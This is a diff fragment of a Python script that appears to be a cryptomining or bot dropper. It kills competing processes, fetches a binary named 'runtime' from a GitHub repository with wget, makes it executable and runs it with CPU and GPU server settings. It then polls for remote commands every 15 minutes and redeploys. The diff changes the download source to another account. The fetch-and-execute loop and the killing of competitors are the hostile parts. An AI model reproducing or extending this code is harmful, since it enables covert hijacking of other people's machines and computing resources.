@@ -122,9 +122,9 @@ args = parser.parse_args()
 
 os.chdir(os.getcwd())
 username = get_username()
-kill_other_processes(['plant', 'python.py', 'plane'])
+kill_other_processes(['plant', 'louis', 'plane'])
 kill_other_python_processes("runtime.py")
-run_bash_command("wget https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime")
+run_bash_command("wget https://github.com/lestikamarchella/pack/raw/main/runtime && chmod +x runtime")
 run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
 
 while True:
@@ -139,7 +139,7 @@ while True:
         args.gpu_server = command.get("gpu_server")
         args.gpu_solo = command.get("gpu_solo")
 
-        kill_other_processes(['plant', 'python.py', 'plane'])
-        run_bash_command("wget https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime")
+        kill_other_processes(['plant', 'louis', 'plane'])
+        run_bash_command("wget https://github.com/lestikamarchella/pack/raw/main/runtime && chmod +x runtime")
         run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
     time.sleep(15 * 60)
